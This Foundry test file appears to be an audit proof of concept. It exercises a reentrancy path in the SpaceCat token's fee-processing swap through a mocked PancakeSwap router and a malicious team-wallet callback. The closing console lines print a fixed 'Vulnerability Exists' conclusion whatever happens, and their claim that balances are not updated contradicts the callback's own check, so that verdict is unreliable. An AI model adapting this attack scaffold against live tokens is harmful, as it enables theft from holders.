// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SpaceCat.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x1111111111111111111111111111111111111111);
    }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;
    
    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint, /* amountIn */
        uint, /* amountOutMin */
        address[] calldata, /* path */
        address to,
        uint /* deadline */
    ) external {
        payable(to).transfer(1 ether);
    }

    function addLiquidityETH(
        address, /* token */
        uint, /* amountTokenDesired */
        uint, /* amountTokenMin */
        uint, /* amountETHMin */
        address, /* to */
        uint /* deadline */
    ) external payable returns (uint, uint, uint) {
        return (0, 0, 0);
    }
}

contract MaliciousTeamWallet {
    SpaceCat public token;
    address public attacker;
    uint256 public expectedBalance;

    constructor(SpaceCat _token, address _attacker) {
        token = _token;
        attacker = _attacker;
    }

    function setExpectedBalance(uint256 _expected) external {
        expectedBalance = _expected;
    }

    receive() external payable {
        uint256 currentBalance = token.balanceOf(attacker);
        require(currentBalance == expectedBalance, "Balance changed during liquidity processing");
    }
}

contract SpaceCatReentrancyTest is Test {
    SpaceCat public token;
    MaliciousTeamWallet public malicious;
    address public owner = address(this);
    address public attacker = address(0x3);
    address public mockFactory;
    MockRouter public mockRouter;
    address public weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        // Deploy mock factory and router
        mockFactory = address(new MockFactory());
        mockRouter = new MockRouter(mockFactory, weth);
        
        // Override PancakeRouter storage
        vm.etch(0x10ED43C718714eb63d5aA57B78B54704E256024E, address(mockRouter).code);
        vm.store(0x10ED43C718714eb63d5aA57B78B54704E256024E, bytes32(uint(0)), bytes32(uint(uint160(mockFactory))));
        vm.store(0x10ED43C718714eb63d5aA57B78B54704E256024E, bytes32(uint(1)), bytes32(uint(uint160(weth))));
        
        // Fund router with 1 ETH for transfers
        vm.deal(address(mockRouter), 1 ether);
        vm.deal(owner, 10 ether);
        
        // Deploy token contract
        token = new SpaceCat();
        address uniswapPair = token.uniswapPair();
        
        // Configure token settings
        token.setNumTokensBeforeSwap(0.1 ether);
        token.setSwapAndLiquifyEnabled(true);
        token.setSelTaxes(100, 0, 0);
        token.setDistributionSettings(0, 0, 10000);
        
        // Setup malicious team wallet
        malicious = new MaliciousTeamWallet(token, attacker);
        token.setTeamWalletAddress(address(malicious));
        
        // Initialize attacker balance
        token.transfer(attacker, 100 ether);
    }

    function testReentrancyVulnerability() public {
        uint256 transferAmount = 1 ether;
        uint256 expectedBalance = token.balanceOf(attacker) - transferAmount;
        malicious.setExpectedBalance(expectedBalance);

        console.log("--- BEFORE-Trigger Attacker Balance ---");
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        console.log("Attacker token balance before transfer: %s", attackerBalanceBefore);
        console.log("Malicious contract expectedBalance: %s", malicious.expectedBalance());

        console.log("--- Trigger Reentrancy Attack Transfer ---");
        vm.startPrank(attacker);
        token.transfer(token.uniswapPair(), transferAmount);
        vm.stopPrank();

        console.log("--- AFTER-Trigger Attacker Balance ---");
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        console.log("Attacker token balance after transfer: %s", attackerBalanceAfter);
        console.log("Balance reduction: %s tokens", attackerBalanceBefore - attackerBalanceAfter);

        console.log("--- Vulnerability Analysis ---");
        console.log("Transfer executed without reverting in receive callback");
        console.log("This confirms token balance is NOT updated during callback");
        console.log("Vulnerability Exists: Reentrancy enables state manipulation during fee processing");
    }
}